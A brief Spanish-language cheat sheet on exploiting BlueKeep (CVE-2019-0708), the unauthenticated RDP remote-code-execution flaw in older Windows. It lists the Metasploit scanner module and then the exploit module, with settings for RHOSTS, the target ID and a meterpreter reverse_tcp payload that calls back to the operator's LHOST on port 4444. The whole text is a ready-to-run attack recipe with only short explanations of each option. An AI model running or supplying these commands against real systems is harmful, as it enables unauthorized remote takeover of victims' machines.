Vulnerabilidad crítica en RDP que permite ejecución remota de código sin autenticación.

• Afecta a Windows antiguos  
• No requiere credenciales  
• Alta criticidad (RCE)

## Escaneo BlueKeep

Detecta si el objetivo es vulnerable a BlueKeep.

```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```
	set RHOSTS IP  
	set RPORT 3389

## Exploit BlueKeep

Explota la vulnerabilidad para obtener acceso remoto.

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```
	set RHOSTS IP  
	set RPORT 3389  
	set TARGET <id>  
	set PAYLOAD windows/meterpreter/reverse_tcp  
	set LHOST TU_IP  
	set LPORT 4444

### TARGET
Define la versión del sistema objetivo.

### PAYLOAD
Tipo de acceso que obtendrás.

### LHOST / LPORT
IP y puerto para recibir la conexión.
